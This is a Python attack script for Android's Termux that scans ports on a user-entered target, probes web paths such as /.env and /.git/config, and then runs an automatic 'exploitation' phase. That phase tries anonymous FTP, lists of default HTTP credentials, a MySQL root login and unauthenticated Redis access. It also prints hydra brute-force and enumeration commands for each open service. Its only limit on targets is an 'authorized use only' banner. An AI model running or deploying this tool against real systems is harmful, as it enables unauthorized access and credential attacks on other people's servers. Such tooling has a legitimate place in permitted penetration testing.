#!/data/data/com.termux/files/usr/bin/python3
"""
Termux Auto Pentest Tool v2.0
Port Scanner + Vuln Checker + Exploit
For authorized security testing only.
Works 100% in Termux without root (some features need root).
"""

import subprocess
import sys
import os
import socket
import threading
import time
import re
from datetime import datetime

# ─── Color setup for Termux ────────────────────────────────────────
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def info(msg):   print(f"{Colors.CYAN}[*]{Colors.END} {msg}")
def ok(msg):     print(f"{Colors.GREEN}[+]{Colors.END} {msg}")
def warn(msg):   print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")
def err(msg):    print(f"{Colors.RED}[X]{Colors.END} {msg}")
def vuln(msg):   print(f"{Colors.RED}[VULN]{Colors.END} {msg}")

# ─── Banner ────────────────────────────────────────────────────────
BANNER = f"""{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════╗
║     Termux Auto Pentest Suite v2.0           ║
║   {Colors.CYAN}Scan → Vuln Check → Exploit{Colors.RED}            ║
║   {Colors.YELLOW}Authorized Use Only{Colors.RED}                   ║
╚══════════════════════════════════════════════╝
{Colors.END}"""

# ─── Service DB (expand as needed) ─────────────────────────────────
SERVICES = {
    7:    "Echo",         9:    "Discard",
    13:   "Daytime",      17:   "QOTD",
    19:   "Chargen",      20:   "FTP-data",
    21:   "FTP",          22:   "SSH",
    23:   "Telnet",       25:   "SMTP",
    37:   "Time",         53:   "DNS",
    67:   "DHCP",         69:   "TFTP",
    70:   "Gopher",       79:   "Finger",
    80:   "HTTP",         88:   "Kerberos",
    110:  "POP3",         111:  "RPC",
    113:  "Ident",        119:  "NNTP",
    123:  "NTP",          135:  "MSRPC",
    137:  "NetBIOS-ns",   138:  "NetBIOS-dgm",
    139:  "NetBIOS-ssn",  143:  "IMAP",
    161:  "SNMP",         162:  "SNMP-trap",
    179:  "BGP",          389:  "LDAP",
    443:  "HTTPS",        445:  "SMB",
    465:  "SMTPS",        500:  "IKE",
    514:  "Syslog",       515:  "Printer",
    520:  "RIP",          521:  "RIPng",
    587:  "SMTP-submit",  631:  "IPP",
    636:  "LDAPS",        993:  "IMAPS",
    995:  "POP3S",        1025:"MSRPC-NFS",
    1080: "SOCKS",        1194: "OpenVPN",
    1352: "Lotus-Notes",  1433: "MSSQL",
    1434: "MSSQL-udp",    1521: "Oracle-DB",
    1723: "PPTP",         2049: "NFS",
    2082: "cPanel",       2083: "cPanel-SSL",
    2181: "ZooKeeper",    2222: "SSH-alt",
    2375: "Docker",       2376: "Docker-SSL",
    2424: "OrientDB",     2483: "Oracle-DB",
    2484: "Oracle-DB-SSL",3128: "Squid-Proxy",
    3306: "MySQL",        3389: "RDP",
    3478: "STUN",         3632: "DistCC",
    3690: "SVN",          4000: "Diablo",
    4369: "Erlang-mapper",4444: "Metasploit",
    4489: "OpenManage",   4848: "GlassFish",
    4899: "Radmin",       5000: "UPnP",
    5001: "UPnP-alt",     5003: "FileMaker",
    5060: "SIP",          5061: "SIP-TLS",
    5143: "NetOp",        5222: "XMPP",
    5269: "XMPP-server",  5432: "PostgreSQL",
    5555: "Android-ADB",  5632: "PCAnywhere",
    5800: "VNC-http",     5900: "VNC",
    5901: "VNC-1",        5984: "CouchDB",
    5985: "WinRM-http",   5986: "WinRM-https",
    6000: "X11",          6001: "X11-1",
    6379: "Redis",        6666: "IRC-alt",
    6667: "IRC",          6881: "BitTorrent",
    6969: "BitTorrent-tracker", 7001: "WebLogic",
    7071: "Zimbra",       8000: "HTTP-alt",
    8001: "HTTP-alt2",    8009: "AJP13",
    8080: "HTTP-proxy",   8081: "HTTP-proxy2",
    8089: "HTTP-alt3",    8090: "HTTP-alt4",
    8181: "HTTP-alt5",    8443: "HTTPS-alt",
    8484: "HTTP-alt6",    8888: "HTTP-alt7",
    9000: "HTTP-alt8",    9001: "Tor-control",
    9040: "Tor",          9050: "SOCKS-Tor",
    9090: "HTTP-alt9",    9100: "Printer-JetDirect",
    9200: "Elasticsearch",9300: "Elasticsearch-transport",
    9418: "Git",          9877: "XAMPP",
    9999: "HTTP-alt10",   10000:"Webmin",
    10134:"Odoo",         11000:"POP3-alt",
    11211:"Memcached",    12017:"FastCGI",
    12345:"NetBus",       13579:"Polaris",
    16010:"HBase",        16379:"Redis-6380",
    16509:"libvirt",      17017:"OpenVPN",
    18091:"Memcached-http",18092:"Memcached-http2",
    19000:"CCP",          19150:"Gkrellmd",
    20000:"Usermin",      21025:"Minecraft",
    22222:"SSH-alt2",     23456:"NetBus-alt",
    24444:"NetBus-alt2",  25565:"Minecraft-JE",
    26208:"NFS-alt",      27015:"Steam",
    27017:"MongoDB",      27018:"MongoDB-web",
    27374:"Sub7",         28017:"MongoDB-status",
    29800:"Mercurial",    29999:"Odoo-long",
    30000:"HTTP-alt11",   30102:"NFS-alt2",
    30718:"NFS-alt3",     31337:"BackOrifice",
    32400:"Plex",         32469:"Plex-TLS",
    32768:"Statd",        32769:"Statd-2",
    33434:"traceroute",   33576:"NFS-alt4",
    37777:"Synology",     38412:"NFS-alt5",
    40000:"SafetyNET",    40809:"NFS-alt6",
    41523:"Kodi",         42280:"HTTP-alt12",
    42942:"NFS-alt7",     44334:"NFS-alt8",
    47001:"WinRM",        49152:"Windows-RPC",
    49153:"Windows-RPC2", 49154:"Windows-RPC3",
    49155:"Windows-RPC4", 49156:"Windows-RPC5",
    49157:"Windows-RPC6", 49158:"Windows-RPC7",
    50000:"SAP-Dispatcher", 50030:"Hadoop",
    50050:"SAP-Gateway",  50070:"Hadoop-NameNode",
    50420:"NFS-alt9",     51413:"BitTorrent",
    60000:"NFS-alt10",    60001:"NFS-alt11",
    61616:"ActiveMQ",     62078:"iPhone-sync",
    64738:"Mumble",       65500:"NFS-alt12",
}

# ─── Targeted services with exploit guidance ───────────────────────
TARGETED_SERVICES = {
    21:  {"name":"FTP",   "exploit":"hydra -l admin -P pass.txt ftp://TARGET"},
    22:  {"name":"SSH",   "exploit":"hydra -l root -P pass.txt ssh://TARGET"},
    23:  {"name":"Telnet","exploit":"hydra -l admin -P pass.txt telnet://TARGET"},
    25:  {"name":"SMTP",  "exploit":"smtp-user-enum -M VRFY -U users.txt -t TARGET"},
    80:  {"name":"HTTP",  "exploit":"nikto -h http://TARGET"},
    110: {"name":"POP3",  "exploit":"hydra -l admin -P pass.txt pop3://TARGET"},
    139: {"name":"NetBIOS","exploit":"enum4linux -a TARGET"},
    143: {"name":"IMAP",  "exploit":"hydra -l admin -P pass.txt imap://TARGET"},
    389: {"name":"LDAP",  "exploit":"ldapsearch -h TARGET -p 389 -x -b 'dc=example,dc=com'"},
    443: {"name":"HTTPS", "exploit":"nikto -h https://TARGET"},
    445: {"name":"SMB",   "exploit":"smbmap -H TARGET"},
    1433:{"name":"MSSQL", "exploit":"hydra -l sa -P pass.txt mssql://TARGET"},
    1521:{"name":"Oracle","exploit":"oscanner -s TARGET -P 1521"},
    2049:{"name":"NFS",   "exploit":"showmount -e TARGET"},
    3306:{"name":"MySQL", "exploit":"hydra -l root -P pass.txt mysql://TARGET"},
    3389:{"name":"RDP",   "exploit":"hydra -l administrator -P pass.txt rdp://TARGET"},
    5432:{"name":"PostgreSQL","exploit":"hydra -l postgres -P pass.txt postgres://TARGET"},
    5900:{"name":"VNC",   "exploit":"hydra -P pass.txt vnc://TARGET"},
    5985:{"name":"WinRM","exploit":"crackmapexec winrm TARGET -u admin -p pass.txt"},
    6379:{"name":"Redis", "exploit":"redis-cli -h TARGET INFO"},
    8080:{"name":"HTTP-proxy","exploit":"nikto -h http://TARGET:8080"},
    8443:{"name":"HTTPS-alt","exploit":"nikto -h https://TARGET:8443"},
    9200:{"name":"Elastic","exploit":"curl http://TARGET:9200/_cat/indices"},
    27017:{"name":"MongoDB","exploit":"mongo TARGET:27017"},
}

# ─── Phase 1: Port Scanner ─────────────────────────────────────────

def resolve_host(target):
    """Resolve hostname to IP."""
    try:
        import socket
        return socket.gethostbyname(target)
    except:
        return None

def scan_port(target, port, timeout=1.5):
    """Scan a single TCP port."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            # Try to grab banner
            try:
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(2)
                s2.connect((target, port))
                s2.send(b"\r\n")
                banner = s2.recv(256).decode('utf-8', errors='ignore').strip()
                s2.close()
            except:
                banner = ""
            return (port, "OPEN", banner[:80])
        return (port, "CLOSED", "")
    except:
        return (port, "ERROR", "")

def port_scan(target, ports):
    """Multi-threaded port scan."""
    info(f"Scanning {len(ports)} ports on {target}...")
    results = []
    threads = []
    lock = threading.Lock()
    
    def worker(port):
        p, status, banner = scan_port(target, port)
        if status == "OPEN":
            with lock:
                results.append((p, banner))
                svc = SERVICES.get(p, "unknown")
                b = f" - {banner[:60]}" if banner else ""
                ok(f"  Port {p:5d}  {Colors.MAGENTA}{svc:14s}{Colors.END}{b}")
    
    for port in ports:
        t = threading.Thread(target=worker, args=(port,))
        threads.append(t)
        t.start()
        # Throttle threads to avoid connection storms
        if len(threads) % 30 == 0:
            time.sleep(0.2)
    
    for t in threads:
        t.join()
    
    results.sort(key=lambda x: x[0])
    return results

# ─── Phase 2: Vuln Check ───────────────────────────────────────────

def check_http_basic(target, port):
    """Quick HTTP check for vulns."""
    proto = "https" if port in [443, 8443] else "http"
    url = f"{proto}://{target}:{port}"
    
    try:
        # Use curl since requests might not be installed
        cmd = ["curl", "-s", "-k", "-L", "--connect-timeout", "5",
               "-m", "10", "-i", url]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        output = r.stdout
        
        # Check for security headers
        missing_headers = []
        for h in ["X-Frame-Options", "X-Content-Type-Options",
                   "Content-Security-Policy", "Strict-Transport-Security"]:
            if h.lower() not in output.lower():
                missing_headers.append(h)
        
        if missing_headers:
            warn(f"  {url} - Missing security headers: {', '.join(missing_headers[:3])}")
        
        # Server header
        server_match = re.search(r'Server:\s*(.+?)[\r\n]', output)
        if server_match:
            server = server_match.group(1).strip()
            ok(f"  {url} - Server: {server}")
            
            # Check for outdated servers
            old_servers = ["Apache/2.2", "Apache/2.0", "IIS/6", "IIS/7", 
                          "nginx/0.", "nginx/1.0", "nginx/1.1", "lighttpd/1.4"]
            for old in old_servers:
                if old in server:
                    vuln(f"  Outdated server: {server} may have known vulns!")
        
        # Grab title
        title_match = re.search(r'<title>(.*?)</title>', output, re.IGNORECASE)
        if title_match:
            info(f"  Title: {title_match.group(1)[:60]}")
        
        return True
    except:
        err(f"  Cannot connect to {url}")
        return False

def check_common_paths(target, port):
    """Check for common web paths."""
    proto = "https" if port in [443, 8443] else "http"
    base = f"{proto}://{target}:{port}"
    
    paths = [
        "/admin", "/login", "/wp-admin", "/administrator",
        "/phpmyadmin", "/manager", "/console", "/panel",
        "/robots.txt", "/.env", "/.git/config", "/sitemap.xml",
        "/backup", "/config", "/api", "/swagger", "/graphql",
        "/debug", "/test", "/dev", "/.htaccess", "/server-status"
    ]
    
    info(f"  Checking common paths on {base}...")
    found = []
    
    for path in paths:
        try:
            cmd = ["curl", "-s", "-k", "--connect-timeout", "3", 
                   "-m", "5", "-o", "/dev/null", "-w", "%{http_code}",
                   f"{base}{path}"]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
            code = r.stdout.strip()
            if code in ["200", "401", "403", "301", "302"]:
                warn(f"  Found: {path} (HTTP {code})")
                found.append(path)
        except:
            pass
    
    return found

def check_common_services(target, open_ports):
    """Check open ports against known vuln services."""
    vuln_found = False
    for port, banner in open_ports:
        if port in TARGETED_SERVICES:
            svc = TARGETED_SERVICES[port]
            vuln(f"  Port {port} - {svc['name']} - Potential target!")
            cmd = svc['exploit'].replace("TARGET", target)
            info(f"    Try: {cmd}")
            vuln_found = True
    
    # HTTP-based checks
    for port, banner in open_ports:
        if port in [80, 443, 8080, 8443, 8000, 8888, 9000]:
            check_http_basic(target, port)
            check_common_paths(target, port)
    
    return vuln_found

# ─── Phase 3: Exploit / Attack ─────────────────────────────────────

def attempt_ftp_anonymous(target, port=21):
    """Try anonymous FTP login."""
    info(f"  Attempting FTP anonymous login on {target}:{port}...")
    try:
        cmd = f"curl -s --connect-timeout 5 -u anonymous:test@test.com " \
               f"ftp://{target}:{port}/ 2>/dev/null"
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        if r.returncode == 0 and "230" in r.stderr:
            ok(f"FTP anonymous login SUCCESSFUL on {target}:{port}!")
            return True
        else:
            warn(f"FTP anonymous login failed")
            return False
    except:
        warn(f"FTP anonymous login failed")
        return False

def attempt_http_basic_auth(target, port):
    """Try common credentials on HTTP auth."""
    proto = "https" if port in [443, 8443] else "http"
    creds = [("admin","admin"), ("admin","password"), ("admin","12345"),
             ("admin","root"), ("root","root"), ("root","toor"),
             ("administrator","administrator"), ("admin","administrator"),
             ("user","user"), ("user","password"), ("test","test")]
    
    for user, pwd in creds:
        try:
            cmd = ["curl", "-s", "-k", "--connect-timeout", "3", "-m", "5",
                   "-u", f"{user}:{pwd}", f"{proto}://{target}:{port}/",
                   "-o", "/dev/null", "-w", "%{http_code}"]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
            code = r.stdout.strip()
            if code not in ["401", "403"] and code != "000":
                if code in ["200", "301", "302"]:
                    ok(f"  Possible weak creds: {user}:{pwd} on {proto}://{target}:{port} (HTTP {code})")
                    return True
        except:
            pass
    return False

def run_exploit(target, port, svc_name):
    """Run exploit attempts based on service type."""
    info(f"  Attempting exploit on port {port} ({svc_name})...")
    
    if port == 21:
        attempt_ftp_anonymous(target, port)
    elif port in [80, 443, 8080, 8443, 8000, 8888, 9000]:
        attempt_http_basic_auth(target, port)
    elif port == 3306:
        # MySQL default creds
        info(f"  Trying MySQL root login...")
        try:
            cmd = f"mysql -h {target} -u root -proot -e 'SELECT 1' 2>/dev/null || " \
                   f"mysql -h {target} -u root -e 'SELECT 1' 2>/dev/null"
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                ok(f"MySQL root login SUCCESS on {target}:3306!")
            else:
                warn(f"MySQL auth failed")
        except:
            warn(f"MySQL check failed (mysql client not installed)")
    elif port == 6379:
        # Redis
        info(f"  Checking Redis...")
        try:
            cmd = f"echo 'INFO' | nc -w 3 {target} 6379 2>/dev/null | head -20"
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=8)
            if "redis_version" in r.stdout:
                ok(f"Redis accessible! Version info available")
                print(f"    {r.stdout[:200]}")
        except:
            pass
    else:
        # Show suggested exploit command
        if port in TARGETED_SERVICES:
            svc = TARGETED_SERVICES[port]
            cmd = svc['exploit'].replace("TARGET", target)
            info(f"  Suggested attack: {cmd}")
            info(f"  Run: {Colors.YELLOW}{cmd}{Colors.END}")

# ─── Helper: Generate port lists ───────────────────────────────────

def get_top_ports(count=20):
    """Get top N most common ports."""
    all_ports = sorted(SERVICES.keys())
    if count >= len(all_ports):
        return all_ports
    # Return the most interesting ports first
    interesting = [21,22,23,25,53,80,110,111,135,139,143,161,389,443,445,
                   465,500,587,631,636,993,995,1080,1433,1521,1723,2049,
                   2082,2083,2181,2375,2376,2483,2484,3128,3306,3389,
                   3478,3632,3690,4369,4444,4848,4899,5000,5060,5222,
                   5432,5555,5632,5800,5900,5984,5985,5986,6000,6379,
                   6666,6667,6881,7001,8000,8001,8009,8080,8081,8089,
                   8090,8181,8443,8484,8888,9000,9001,9040,9050,9090,
                   9100,9200,9300,9418,9877,9999,10000,11211,12345,16010,
                   16379,16509,17017,20000,25565,27017,28017,31337,32400,
                   32768,33434,49152,50000,50070,51413,61616]
    return interesting[:count]

def get_all_ports():
    """Get all defined ports."""
    return sorted(SERVICES.keys())

# ─── Main Menu ──────────────────────────────────────────────────────

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    # Check for root (for low port scanning)
    root_check = subprocess.run(["id", "-u"], capture_output=True, text=True)
    is_root = root_check.stdout.strip() == "0"
    if is_root:
        ok(f"Running as root - full capabilities enabled")
    else:
        warn(f"Running as non-root - can't scan privileged ports (< 1024) without root")
        warn(f"Install nmap and use: sudo nmap -sS target")
    
    # Get target
    target_input = input(f"\n{Colors.CYAN}[?]{Colors.END} Target (IP/domain): ").strip()
    if not target_input:
        err("No target specified.")
        return
    
    ip = resolve_host(target_input)
    if not ip:
        err(f"Cannot resolve: {target_input}")
        return
    ok(f"Target resolved: {target_input} -> {Colors.BOLD}{ip}{Colors.END}")
    
    # Quick host check
    info("Checking if host is reachable...")
    ping = subprocess.run(["ping", "-c", "1", "-W", "2", ip], 
                          capture_output=True, text=True)
    if ping.returncode != 0:
        warn("Host may be offline or blocking ICMP")
        cont = input("Continue anyway? (y/N): ").strip().lower()
        if cont != 'y':
            return
    else:
        ok("Host is reachable")
    
    # ── Mode Selection ──
    print(f"\n{Colors.YELLOW}{Colors.BOLD}Select scan mode:{Colors.END}")
    print(f"  {Colors.CYAN}[1]{Colors.END} Quick Scan (top 50 ports)")
    print(f"  {Colors.CYAN}[2]{Colors.END} Standard Scan (all ~200 known ports)")
    print(f"  {Colors.CYAN}[3]{Colors.END} Full Scan + Vuln Check")
    print(f"  {Colors.CYAN}[4]{Colors.END} Full Auto (Scan → Vuln → Exploit)")
    print(f"  {Colors.CYAN}[5]{Colors.END} Stealth Scan (top 20, slower)")
    
    mode = input(f"\n{Colors.CYAN}[?]{Colors.END} Choice [1-5] (default 4): ").strip() or "4"
    
    # Set port list based on mode
    if mode == "1":
        ports = get_top_ports(50)
    elif mode == "2":
        ports = get_all_ports()
    elif mode == "3":
        ports = get_all_ports()
    elif mode == "4":
        ports = get_top_ports(100)
    elif mode == "5":
        ports = get_top_ports(20)
    else:
        ports = get_top_ports(100)
    
    print(f"\n{Colors.RED}{Colors.BOLD}{'='*50}{Colors.END}")
    print(f"{Colors.GREEN}{Colors.BOLD}  PHASE 1: PORT SCANNING ({len(ports)} ports){Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}{'='*50}{Colors.END}")
    start_time = time.time()
    open_ports = port_scan(ip, ports)
    elapsed = time.time() - start_time
    
    if not open_ports:
        warn("No open ports found")
        return
    
    ok(f"Found {len(open_ports)} open ports in {elapsed:.1f}s")
    
    # ── Phase 2: Vulnerability Check ──
    if mode in ["3", "4"]:
        print(f"\n{Colors.RED}{Colors.BOLD}{'='*50}{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}  PHASE 2: VULNERABILITY CHECK{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}{'='*50}{Colors.END}")
        
        vuln_found = check_common_services(ip, open_ports)
        
        if not vuln_found:
            warn("No obvious high-severity vulns found on targeted services")
            info("Try nmap with NSE: nmap -sV --script vuln [target]")
    
    # ── Phase 3: Exploitation ──
    if mode == "4":
        print(f"\n{Colors.RED}{Colors.BOLD}{'='*50}{Colors.END}")
        print(f"{Colors.GREEN}{Colors.BOLD}  PHASE 3: EXPLOITATION{Colors.END}")
        print(f"{Colors.RED}{Colors.BOLD}{'='*50}{Colors.END}")
        
        for port, banner in open_ports:
            svc = SERVICES.get(port, "unknown")
            print(f"\n{Colors.YELLOW}  ── {ip}:{port} ({svc}) ──{Colors.END}")
            run_exploit(ip, port, svc)
    
    # ── Summary ──
    print(f"\n{Colors.RED}{Colors.BOLD}{'='*50}{Colors.END}")
    print(f"{Colors.GREEN}  Scan complete! Results:{Colors.END}")
    
    if not is_root:
        print(f"\n{Colors.YELLOW}  Root recommended for deeper scanning.{Colors.END}")
        print(f"{Colors.YELLOW}  Install nmap: pkg install nmap{Colors.END}")
        print(f"{Colors.YELLOW}  Then: sudo nmap -sV -O {ip}{Colors.END}")
    
    # Print clean port table
    print(f"\n{Colors.CYAN}{'PORT':<8}{'STATE':<8}{'SERVICE':<18}{'BANNER'}{Colors.END}")
    print(f"{Colors.CYAN}{'-'*70}{Colors.END}")
    for port, banner in open_ports:
        svc = SERVICES.get(port, "unknown")
        b = banner[:45] if banner else ""
        print(f"{port:<8}{Colors.GREEN}open{Colors.END:<8}{svc:<18}{b}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user. Exiting.{Colors.END}")
        sys.exit(0)
    except Exception as e:
        err(f"Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
